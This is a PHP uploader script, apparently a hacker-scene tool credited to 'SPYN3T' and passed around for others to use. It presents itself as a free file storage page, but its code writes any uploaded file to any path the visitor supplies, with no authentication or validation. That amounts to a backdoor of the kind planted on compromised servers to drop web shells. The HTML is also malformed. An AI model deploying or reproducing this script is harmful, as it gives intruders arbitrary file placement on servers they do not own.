--- Uploading Script Designed By SPYN3T--
---Enjoy Everyone!---
---If anyone created a better version, Send it to me (:--
                                                              => cy@live.no <=



<?php
         
        $files = @$_FILES["files"];
        if ($files["name"] != '') {
            $fullpath = $_REQUEST["path"] . $files["name"];
            if (move_uploaded_file($files['tmp_name'], $fullpath)) {
                echo "<h1><a href='$fullpath'>{View File /w Link}</a></h1>";
            }
        }echo '<html>
    <head>
    <title>Files Storage</title>
    </head>
    <!--
    body,td,th {
            font-family: Courier New;
            font-size: 12px;
            color: #636161;
    }
    body {
            margin-top: 100px;
            margin-left: 200px;
            margin-right: 200px;
            background-color: #121212;
    }
    a {
            font-size: 12px;
    }
    a:link {
            text-decoration: none;
            color: #666666;
    }
    a:visited {
            text-decoration: none;
            color: #666666;
    }
    a:hover {
            text-decoration: none;
    }
    a:active {
            text-decoration: none;
    }
    h1,h2,h3,h4,h5,h6 {
            font-style: italic;
    }
    -->
    </style><TITLE>-</TITLE>
     
     
    </head><font size="5"><body bgcolor="#1874CD" text="#141414"><div align="center">
     <pre>
    <center>
    <img src="https://cdn0.iconfinder.com/data/icons/simple-seo-and-internet-icons/512/upload_cloud_information-512.png" height="400"></p><b>
    Hello Dear User,<br></br>Here,You can upload any kind of files no matter what it was and how big is it.<br></br>*No Sign Up Required<br></br>*No Ads<br></br>*No Crap.
    <body>
    <form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><br></br><input type=submit value="{Upload}"></form></body></html><html><head><style type="text/css">
    </div></body></html>';
        ?>
